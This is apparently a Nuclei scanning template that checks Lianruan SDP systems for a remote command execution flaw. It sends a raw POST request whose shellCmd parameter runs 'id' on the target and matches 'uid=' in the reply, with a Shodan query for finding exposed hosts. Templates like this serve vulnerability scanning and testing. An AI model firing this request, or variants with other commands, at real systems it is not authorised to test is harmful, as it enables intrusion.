id: lianruan_rdp_rce
info:
  name: 联软SDP RCE
  author: momika233233
  severity: medium
  description: |
    lianruan SDP RCE
  reference:
    - https://github.com/momika233
  metadata:
    shodan-query: 
    shodan-query: app="联软SDP系统"
  tags: cve,cve2022,lianruanSDP,RCE


  requests:

    -raw:
    - |
      POST {{BaseURL}}/TunnelGateway/commondRetStr HTTP/1.1
      Content-Type: application/x-www-form-urlencoded

      shellCmd=id

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "uid=.*"

      - type: status
        status:
          - 200